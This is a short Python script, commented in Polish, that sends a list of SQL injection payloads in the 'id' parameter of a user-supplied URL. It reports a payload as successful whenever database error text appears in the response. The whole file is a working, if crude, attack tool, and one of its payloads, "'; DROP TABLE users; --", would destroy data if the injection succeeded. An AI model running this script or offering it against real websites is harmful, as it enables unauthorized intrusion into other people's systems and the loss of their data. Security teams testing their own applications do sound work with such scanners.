import requests
url = "" #wprowadź URL strony
payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1 --", "' OR 'a'='a"]
for payload in payloads:
    params = {"id": payload}
    response = requests.get(url, params=params)

    if "SQL" in response.text or "syntax" in response.text or "mysql" in response.text.lower():
        print(f"SQL Injection działa z payloadem: {payload}")
    else:
        print(f"SQL Injection nie działa z payloadem: {payload}")
